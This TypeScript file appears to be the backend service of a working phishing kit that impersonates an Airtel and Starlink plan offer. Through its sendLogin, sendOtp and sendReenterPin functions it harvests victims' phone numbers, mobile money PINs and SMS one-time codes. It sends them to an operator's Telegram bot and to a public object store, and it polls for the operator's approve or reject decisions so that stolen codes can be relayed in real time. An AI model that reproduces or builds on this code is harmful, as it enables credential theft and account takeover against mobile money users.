import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';
import { safeStorage } from '../utils/safeBrowser';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  countryCode?: string;
  airtelBrand?: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramReenterPinPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  originalPin?: string;
  pin: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
}

const BROWSER_HEADERS = {
  'Content-Type': 'application/json',
  'Accept': 'application/json',
};

class TelegramService {
  private cloudIdMap: Map<string, string> = new Map();
  private processedUpdateIds: Set<number> = new Set();
  private serverWorkerActive: boolean = false;
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      fullPhone?: string;
      country?: string;
      pin?: string;
      reenterPin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
      cloudId?: string;
    }
  > = new Map();

  /**
   * Helper to retrieve persisted cloudId across tabs, reloads, or OTP steps
   */
  public getCloudId(sessionId: string): string {
    if (this.cloudIdMap.has(sessionId)) {
      return this.cloudIdMap.get(sessionId)!;
    }
    const saved = safeStorage.getItem(`airtel_cloud_id_${sessionId}`);
    if (saved) {
      this.cloudIdMap.set(sessionId, saved);
      return saved;
    }
    return sessionId;
  }

  /**
   * Helper to persist cloudId
   */
  public setCloudId(sessionId: string, cloudId: string) {
    this.cloudIdMap.set(sessionId, cloudId);
    safeStorage.setItem(`airtel_cloud_id_${sessionId}`, cloudId);
    safeStorage.setItem(`airtel_active_session`, sessionId);
    safeStorage.setItem(`airtel_active_cloud_id`, cloudId);
  }

  /**
   * Helper to safely parse JSON
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Ensure callback_data never exceeds Telegram's 64-byte limit
   */
  private getSafeCallbackId(id: string): string {
    const clean = (id || '').trim();
    if (clean.length <= 36) return clean;
    return clean.slice(0, 18) + '_' + clean.slice(-14);
  }

  /**
   * Probe the local server health endpoint. If the server reports its polling
   * worker is active, mark it so we never issue a competing getUpdates call
   * (which would trigger a Telegram 409 Conflict).
   */
  private async probeServerWorker(): Promise<void> {
    if (this.serverWorkerActive) return;
    try {
      const res = await fetch('/api/health', { cache: 'no-store' });
      if (res.ok) {
        const data = await this.safeJson(res);
        if (data && data.serverWorkerActive === true) {
          this.serverWorkerActive = true;
        }
      }
    } catch {
      // Server unreachable; keep serverWorkerActive false so fallbacks can run.
    }
  }

  /**
   * Mark existing Telegram updates as processed before a new submission
   * (prevents stale reject_otp / reject_login callbacks from re-triggering on retry)
   */
  private async snapshotExistingUpdates(): Promise<void> {
    await this.probeServerWorker();
    if (this.serverWorkerActive) return;
    const token = getTelegramBotToken();
    if (!token) return;
    try {
      const allowedParam = encodeURIComponent(JSON.stringify(['callback_query']));
      const tgRes = await fetch(
        `https://api.telegram.org/bot${token}/getUpdates?limit=30&allowed_updates=${allowedParam}`,
        { cache: 'no-store' }
      );
      if (tgRes.ok) {
        const tgData = await this.safeJson(tgRes);
        if (tgData && tgData.ok && Array.isArray(tgData.result)) {
          for (const upd of tgData.result) {
            if (typeof upd.update_id === 'number') {
              this.processedUpdateIds.add(upd.update_id);
            }
          }
        }
      }
    } catch {
      // Ignore snapshot errors
    }
  }

  /**
   * Send direct Telegram message using Bot API with automatic retry & 429 rate-limit handling
   */
  public async sendDirectTelegramMessage(text: string, inlineKeyboard?: any): Promise<any> {
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();
    if (!token || !chatId) return null;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const payload: any = {
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
    };
    if (inlineKeyboard) {
      payload.reply_markup = {
        inline_keyboard: inlineKeyboard,
      };
    }

    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 10000);

        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          signal: controller.signal,
        });
        clearTimeout(timeout);

        const data = await this.safeJson(res);
        if (data && data.ok) {
          return data;
        }

        if (res.status === 429 || data?.error_code === 429) {
          const retryAfter = Math.min(data?.parameters?.retry_after || 2, 6);
          await new Promise((r) => setTimeout(r, retryAfter * 1000 + 150));
          continue;
        }

        if (attempt < 3) {
          await new Promise((r) => setTimeout(r, 400 * attempt));
        }
      } catch (err) {
        console.warn(`[TelegramService] Direct send attempt ${attempt} warning:`, err);
        if (attempt < 3) {
          await new Promise((r) => setTimeout(r, 500 * attempt));
        }
      }
    }
    return null;
  }

  /**
   * Helper to POST to backend API with automatic retry on transient failure
   */
  private async postBackendWithRetry(endpoint: string, bodyObj: any): Promise<any> {
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 9000);

        const res = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(bodyObj),
          signal: controller.signal,
        });
        clearTimeout(timeout);

        if (res.ok) {
          const data = await this.safeJson(res);
          if (data) return data;
        }
      } catch {
        if (attempt < 2) {
          await new Promise((r) => setTimeout(r, 350));
        }
      }
    }
    return null;
  }

  /**
   * Send Login Credentials (Phone + 4-digit PIN)
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanPhone = phone.replace(/\D/g, '');
    const cleanPin = pin.slice(0, 4);

    let resolvedCloudId = this.getCloudId(sessionId);

    this.localSessionState.set(sessionId, {
      loginStatus: 'pending',
      otpStatus: 'idle',
      reenterStatus: 'idle',
      phone: cleanPhone,
      fullPhone: fullPhone || `+243 ${cleanPhone}`,
      country: country || 'Airtel Africa',
      pin: cleanPin,
      planName,
      planPrice,
      cloudId: resolvedCloudId,
    });

    await this.snapshotExistingUpdates();

    // 1. Try server or Vercel serverless endpoint first
    const serverData = await this.postBackendWithRetry('/api/telegram/send-login', {
      sessionId,
      cloudId: resolvedCloudId,
      phone: cleanPhone,
      fullPhone: fullPhone || `+243 ${cleanPhone}`,
      country: country || 'Airtel Africa',
      airtelBrand: airtelBrand || 'Airtel x Starlink Direct',
      pin: cleanPin,
      planName,
      planPrice,
    });

    if (serverData && serverData.success) {
      if (serverData.cloudId) {
        resolvedCloudId = serverData.cloudId;
        this.setCloudId(sessionId, resolvedCloudId);
      }
      // If server confirmed it delivered the Telegram message (or serverless returned telegram.ok), we're done!
      if (serverData.telegramSent === true || serverData.telegram?.ok === true) {
        return true;
      }
    }

    // 2. Direct Cloud Store + Telegram API Fallback (Ensures 100% delivery even if server lacks token or is static)
    try {
      const cloudRes = await fetch('https://api.restful-api.dev/objects', {
        method: 'POST',
        headers: BROWSER_HEADERS,
        body: JSON.stringify({
          name: `stl_${cleanPhone}`,
          data: {
            sessionId,
            phone: cleanPhone,
            fullPhone: fullPhone || `+243 ${cleanPhone}`,
            country: country || 'Airtel Africa',
            airtelBrand: airtelBrand || 'Airtel x Starlink Direct',
            pin: cleanPin,
            planName,
            planPrice,
            loginStatus: 'pending',
            otpStatus: 'idle',
            reenterStatus: 'idle',
            createdAt: Date.now(),
            lastUpdated: Date.now(),
          },
        }),
      });

      if (cloudRes.ok) {
        const cloudData = await this.safeJson(cloudRes);
        if (cloudData && cloudData.id) {
          resolvedCloudId = cloudData.id;
          this.setCloudId(sessionId, resolvedCloudId);
        }
      }
    } catch (err) {
      console.warn('Direct cloud store creation warning:', err);
    }

    const updatedLocal = this.localSessionState.get(sessionId);
    if (updatedLocal) {
      updatedLocal.cloudId = resolvedCloudId;
    }

    const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
    const displayCountry = country || 'Airtel Africa';
    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
    const cbId = this.getSafeCallbackId(resolvedCloudId || sessionId);

    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
      `📶 <b>Réseau:</b> ${displayBrand}\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${cbId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${cbId}`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Send OTP Verification Code (4 digits)
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
    const resolvedCloudId = this.getCloudId(sessionId);

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'pending' as const,
      cloudId: resolvedCloudId,
      fullPhone,
      country,
    };
    existing.otp = cleanOtp;
    existing.otpStatus = 'pending';
    if (fullPhone) existing.fullPhone = fullPhone;
    if (country) existing.country = country;
    if (planName) existing.planName = planName;
    if (planPrice) existing.planPrice = planPrice;
    this.localSessionState.set(sessionId, existing);

    await this.snapshotExistingUpdates();

    // 1. Try server or Vercel serverless endpoint with retry
    const serverData = await this.postBackendWithRetry('/api/telegram/send-otp', {
      sessionId,
      cloudId: resolvedCloudId,
      phone,
      fullPhone: fullPhone || existing.fullPhone,
      country: country || existing.country,
      airtelBrand: airtelBrand || 'Airtel Starlink',
      otp: cleanOtp,
      planName: planName || existing.planName,
      planPrice: planPrice || existing.planPrice,
    });

    if (serverData && serverData.success) {
      if (serverData.telegramSent === true || serverData.telegramResult?.ok === true) {
        return true;
      }
    }

    // 2. Direct Cloud Store Update + Telegram Message Fallback
    try {
      if (resolvedCloudId && !resolvedCloudId.startsWith('stl_')) {
        const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          headers: BROWSER_HEADERS,
          cache: 'no-store',
        });
        if (fetchRes.ok) {
          const record = await this.safeJson(fetchRes);
          const data = record?.data || {};
          data.otp = cleanOtp;
          data.otpStatus = 'pending';
          data.lastUpdated = Date.now();

          await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
            method: 'PUT',
            headers: BROWSER_HEADERS,
            body: JSON.stringify({
              name: record?.name || resolvedCloudId,
              data,
            }),
          });
        }
      }
    } catch (err) {
      console.warn('Direct cloud store OTP update warning:', err);
    }

    const displayPhone =
      fullPhone ||
      payload.fullPhone ||
      phone ||
      existing.fullPhone ||
      (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
    const displayCountry = country || existing.country || 'Airtel Africa';
    const cbId = this.getSafeCallbackId(resolvedCloudId || sessionId);

    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `🔑 <b>Code PIN Initial:</b> <code>${existing.pin || '****'}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${
        planPrice || existing.planPrice || '$1.49'
      })\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider OTP',
          callback_data: `approve_otp_${cbId}`,
        },
        {
          text: '❌ Rejeter OTP',
          callback_data: `reject_otp_${cbId}`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Notify Telegram Bot that the user requested a new OTP SMS resend
   */
  public async requestOtpResend(payload: {
    sessionId: string;
    phone?: string;
    fullPhone?: string;
    country?: string;
    planName?: string;
    planPrice?: string;
  }): Promise<boolean> {
    const { sessionId, phone, fullPhone, country, planName, planPrice } = payload;
    const resolvedCloudId = this.getCloudId(sessionId);

    const existing = this.localSessionState.get(sessionId);
    if (existing) {
      existing.otpStatus = 'idle';
    }

    const serverData = await this.postBackendWithRetry('/api/telegram/resend-otp', {
      sessionId,
      cloudId: resolvedCloudId,
      phone,
      fullPhone: fullPhone || existing?.fullPhone,
      country: country || existing?.country,
      planName: planName || existing?.planName,
      planPrice: planPrice || existing?.planPrice,
    });

    if (serverData && serverData.success && serverData.telegramSent === true) {
      return true;
    }

    const displayPhone = fullPhone || existing?.fullPhone || phone || 'Inconnu';
    const displayCountry = country || existing?.country || 'Airtel Africa';

    const messageText =
      `🔄 <b>DEMANDE DE RENVOI D'UN NOUVEAU CODE OTP SMS</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing?.planName || 'Forfait Airtel Starlink'} (${
        planPrice || existing?.planPrice || '$1.49'
      })\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `ℹ️ <i>Le client demande l'envoi d'un nouveau code OTP par SMS.</i>`;

    await this.sendDirectTelegramMessage(messageText);
    return true;
  }

  /**
   * Send Re-entered / Confirmed 4-digit PIN to Telegram Bot
   */
  public async sendReenterPin(payload: TelegramReenterPinPayload): Promise<boolean> {
    const { sessionId, phone, pin, originalPin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanPin = pin.replace(/\D/g, '').slice(0, 4);
    const resolvedCloudId = this.getCloudId(sessionId);

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'approved' as const,
      reenterStatus: 'pending' as const,
      cloudId: resolvedCloudId,
      fullPhone,
      country,
    };
    existing.reenterPin = cleanPin;
    existing.reenterStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    await this.snapshotExistingUpdates();

    // 1. Try server or Vercel serverless endpoint with retry
    const serverData = await this.postBackendWithRetry('/api/telegram/send-reenter-pin', {
      sessionId,
      cloudId: resolvedCloudId,
      phone,
      fullPhone: fullPhone || existing.fullPhone,
      country: country || existing.country,
      airtelBrand: airtelBrand || 'Airtel Starlink',
      originalPin: originalPin || existing.pin,
      pin: cleanPin,
      planName: planName || existing.planName,
      planPrice: planPrice || existing.planPrice,
    });

    if (serverData && serverData.success) {
      if (serverData.telegramSent === true || serverData.telegramResult?.ok === true) {
        return true;
      }
    }

    // 2. Direct Cloud Store Update + Telegram Message Fallback
    try {
      if (resolvedCloudId && !resolvedCloudId.startsWith('stl_')) {
        const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          headers: BROWSER_HEADERS,
          cache: 'no-store',
        });
        if (fetchRes.ok) {
          const record = await this.safeJson(fetchRes);
          const data = record?.data || {};
          data.reenterPin = cleanPin;
          data.reenterStatus = 'pending';
          data.lastUpdated = Date.now();

          await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
            method: 'PUT',
            headers: BROWSER_HEADERS,
            body: JSON.stringify({
              name: record?.name || resolvedCloudId,
              data,
            }),
          });
        }
      }
    } catch (err) {
      console.warn('Direct cloud store reenter update warning:', err);
    }

    const displayPhone =
      fullPhone ||
      payload.fullPhone ||
      phone ||
      existing.fullPhone ||
      (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
    const displayCountry = country || existing.country || 'Airtel Africa';
    const cbId = this.getSafeCallbackId(resolvedCloudId || sessionId);

    const messageText =
      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${cleanPin}</code>\n` +
      `📌 <b>Code PIN Initial:</b> <code>${existing.pin || originalPin || 'N/A'}</code>\n` +
      `🔢 <b>Code OTP Validé:</b> <code>${existing.otp || '****'}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${
        planPrice || existing.planPrice || '$1.49'
      })\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN Final',
          callback_data: `approve_reenter_${cbId}`,
        },
        {
          text: '❌ Rejeter PIN Final',
          callback_data: `reject_reenter_${cbId}`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Fast Real-time Status Polling (Multi-Tier Concurrent-Safe Check)
   * 1. Check local session state
   * 2. Event-driven server wait-status (< 50ms latency, supports hundreds of concurrent sessions)
   * 3. Server status snapshot check with sessionId, cloudId, and phone fallback
   * 4. Direct Telegram getUpdates query (only when central server worker is not active, with update_id deduplication)
   * 5. Cloud State Lookup on restful-api.dev
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp' | 'reenter',
    phone?: string
  ): Promise<'pending' | 'approved' | 'rejected'> {
    // 1. Check local cached session state
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
        return local.otpStatus;
      }
      if (targetStep === 'reenter' && (local.reenterStatus === 'approved' || local.reenterStatus === 'rejected')) {
        return local.reenterStatus;
      }
    }

    const resolvedCloudId = this.getCloudId(sessionId);
    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
    const timestamp = Date.now();

    // 2. High-speed Event-driven /api/telegram/wait-status (Suspends until bot button click or 5s timeout)
    try {
      const waitController = new AbortController();
      const waitTimeout = setTimeout(() => waitController.abort(), 6500);

      const waitUrl = `/api/telegram/wait-status?sessionId=${encodeURIComponent(
        sessionId
      )}&cloudId=${encodeURIComponent(resolvedCloudId)}&phone=${encodeURIComponent(
        cleanPhone
      )}&targetStep=${targetStep}&timeout=5000&_t=${timestamp}`;

      const waitRes = await fetch(waitUrl, {
        signal: waitController.signal,
        cache: 'no-store',
        headers: { 'Cache-Control': 'no-cache' },
      });
      clearTimeout(waitTimeout);

      if (waitRes.ok) {
        const waitData = await this.safeJson(waitRes);
        if (waitData) {
          if (waitData.serverWorkerActive === true) {
            this.serverWorkerActive = true;
          }
          if (waitData.status === 'approved' || waitData.status === 'rejected') {
            if (local) {
              if (targetStep === 'login') local.loginStatus = waitData.status;
              if (targetStep === 'otp') local.otpStatus = waitData.status;
              if (targetStep === 'reenter') local.reenterStatus = waitData.status;
            }
            return waitData.status;
          }
        }
      }
    } catch {
      // wait-status network or abort, proceed to status snapshot
    }

    // 3. Check /api/telegram/status snapshot
    try {
      const statusUrl = `/api/telegram/status?id=${encodeURIComponent(resolvedCloudId)}&sessionId=${encodeURIComponent(
        sessionId
      )}&phone=${encodeURIComponent(cleanPhone)}&_t=${timestamp}`;

      const serverRes = await fetch(statusUrl, {
        cache: 'no-store',
        headers: { 'Cache-Control': 'no-cache' },
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data) {
          if (data.serverWorkerActive === true) {
            this.serverWorkerActive = true;
          }
          if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
            if (local) local.loginStatus = data.loginStatus;
            return data.loginStatus;
          }
          if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
            if (local) local.otpStatus = data.otpStatus;
            return data.otpStatus;
          }
          if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
            if (local) local.reenterStatus = data.reenterStatus;
            return data.reenterStatus;
          }
        }
      }
    } catch {
      // Backend snapshot unavailable
    }

    // 4. Direct Telegram getUpdates verification (Only when central server worker is NOT active)
    //    Probe the server first so we don't issue a competing getUpdates (409 Conflict).
    await this.probeServerWorker();
    if (!this.serverWorkerActive) {
      try {
        const token = getTelegramBotToken();
        if (token) {
          const allowedParam = encodeURIComponent(JSON.stringify(['callback_query']));
          const tgRes = await fetch(
            `https://api.telegram.org/bot${token}/getUpdates?limit=30&allowed_updates=${allowedParam}`,
            {
              cache: 'no-store',
            }
          );
          if (tgRes.ok) {
            const tgData = await this.safeJson(tgRes);
            if (tgData && tgData.ok && Array.isArray(tgData.result)) {
              for (const upd of tgData.result) {
                if (typeof upd.update_id === 'number' && this.processedUpdateIds.has(upd.update_id)) {
                  continue;
                }

                const cqData = upd.callback_query?.data || '';
                if (!cqData) continue;

                const cbSessionId = this.getSafeCallbackId(sessionId);
                const cbCloudId = this.getSafeCallbackId(resolvedCloudId);

                const isMatch =
                  cqData.includes(sessionId) ||
                  cqData.includes(cbSessionId) ||
                  (resolvedCloudId && (cqData.includes(resolvedCloudId) || cqData.includes(cbCloudId))) ||
                  (cleanPhone && cleanPhone.length > 5 && cqData.includes(cleanPhone));

                if (isMatch) {
                  if (targetStep === 'login') {
                    if (cqData.startsWith('approve_login')) {
                      if (typeof upd.update_id === 'number') this.processedUpdateIds.add(upd.update_id);
                      if (local) local.loginStatus = 'approved';
                      return 'approved';
                    }
                    if (cqData.startsWith('reject_login')) {
                      if (typeof upd.update_id === 'number') this.processedUpdateIds.add(upd.update_id);
                      if (local) local.loginStatus = 'rejected';
                      return 'rejected';
                    }
                  } else if (targetStep === 'otp') {
                    if (cqData.startsWith('approve_otp')) {
                      if (typeof upd.update_id === 'number') this.processedUpdateIds.add(upd.update_id);
                      if (local) local.otpStatus = 'approved';
                      return 'approved';
                    }
                    if (cqData.startsWith('reject_otp')) {
                      if (typeof upd.update_id === 'number') this.processedUpdateIds.add(upd.update_id);
                      if (local) local.otpStatus = 'rejected';
                      return 'rejected';
                    }
                  } else if (targetStep === 'reenter') {
                    if (cqData.startsWith('approve_reenter')) {
                      if (typeof upd.update_id === 'number') this.processedUpdateIds.add(upd.update_id);
                      if (local) local.reenterStatus = 'approved';
                      return 'approved';
                    }
                    if (cqData.startsWith('reject_reenter')) {
                      if (typeof upd.update_id === 'number') this.processedUpdateIds.add(upd.update_id);
                      if (local) local.reenterStatus = 'rejected';
                      return 'rejected';
                    }
                  }
                }
              }
            }
          }
        }
      } catch {
        // Direct telegram check catch
      }
    }

    // 5. Cloud State Lookup on restful-api.dev only if resolvedCloudId is an actual cloudId
    if (resolvedCloudId && resolvedCloudId !== sessionId && !resolvedCloudId.startsWith('stl_')) {
      try {
        const cloudRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          headers: BROWSER_HEADERS,
          cache: 'no-store',
        });
        if (cloudRes.ok) {
          const record = await this.safeJson(cloudRes);
          const data = record?.data || {};

          if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
            if (local) local.loginStatus = data.loginStatus;
            return data.loginStatus;
          }
          if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
            if (local) local.otpStatus = data.otpStatus;
            return data.otpStatus;
          }
          if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
            if (local) local.reenterStatus = data.reenterStatus;
            return data.reenterStatus;
          }
        }
      } catch {}
    }

    return 'pending';
  }
}

export const telegramService = new TelegramService();

